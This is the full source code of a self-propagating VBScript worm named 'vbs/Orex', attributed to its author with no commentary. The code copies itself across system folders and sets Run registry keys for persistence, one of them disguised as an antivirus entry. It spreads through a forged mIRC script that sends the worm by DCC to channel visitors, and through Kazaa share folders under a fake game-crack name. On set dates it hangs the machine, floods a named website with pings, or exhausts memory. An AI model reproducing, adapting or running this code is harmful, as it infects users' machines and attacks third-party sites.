   ' vbs/Orex
   ' by Razorblade

   dim wsh
   dim fso
   dim gf

   On Error Resume Next

   set wsh = CreateObject("WScript.Shell")
   set fso = CreateObject("Scripting.FileSystemObject")
   set gf = fso.GetFile(WScript.ScriptFullName)

   gf.Copy("C:\orex.vbs")
   gf.Copy("C:\Programme\orex.vbs")
   gf.Copy("C:\kernel32.vbs")
   gf.Copy("A:\orex44.vbs")
   gf.Copy("C:\WINDOWS\orex44.vbs")

   wsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\OrexLoader","C:\orex.vbs","REG_SZ"
   wsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVGNT56","C:\WINDOWS\orex44.vbs","REG_SZ"

   if day(now) = 1 then
   do
   loop
   end if

   if day(now) = 10 then
   CreateObject("WScript.Shell").Run "Ping -t -l 10000 www.ebay.de",0,false
   end if

   On Error Resume Next

   set mirc = fso.CreateTextFile("C:\Programme\mIRC\script.ini")
   mirc.WriteLine "[script]"
   mirc.WriteLine ";mIRC Script"
   mirc.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
   mirc.WriteLine ";  corrupt... WINDOWS will affect and will not run correctly. thanks"
   mirc.WriteLine ";"
   mirc.WriteLine ";Khaled Mardam-Bey"
   mirc.WriteLine ";http://www.mirc.com"
   mirc.WriteLine ";"
   mirc.WriteLine "n0=on *:JOIN:#:{"
   mirc.WriteLine "n1=  if ( $nick == $me ) { halt }"
   mirc.WriteLine "n2=  /dcc send $nick "C:\WINDOWS\orex44.vbs"
   mirc.WriteLine "n3=}"
   mirc.close

   gf.Copy("C:\Programme\Kazaa\My~1\half-life2crack.vbs")
   gf.Copy("C:\Programme\Kazaa Lite\My~1\half-life2crack.vbs")
   gf.Copy("C:\Programme\Kazaa Lite K++\My~1\half-life2crack.vbs")

   if day(now) = 20 then
   dim a(101)
   dim n
   n=0
   do
   n=n+1
   if n>100 then n=1
   a(n)=space(10^8)
   loop
   end if

   ' end
